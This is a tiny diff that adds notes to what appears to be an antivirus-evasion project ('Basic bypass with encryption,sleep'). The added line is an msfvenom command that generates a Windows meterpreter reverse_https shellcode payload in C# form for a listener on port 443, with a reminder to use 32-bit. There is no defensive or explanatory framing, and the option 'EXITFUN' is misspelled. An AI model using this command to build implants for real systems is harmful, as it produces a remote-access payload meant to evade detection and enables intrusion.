@@ -1,3 +1,6 @@
+Remember to use 32 bit 
+msfvenom -p windows/meterpreter/reverse_https lhost=eth0 lport=443 EXITFUN=thread -f csharp
+
 Basic bypass with encryption,sleep 
 
 added
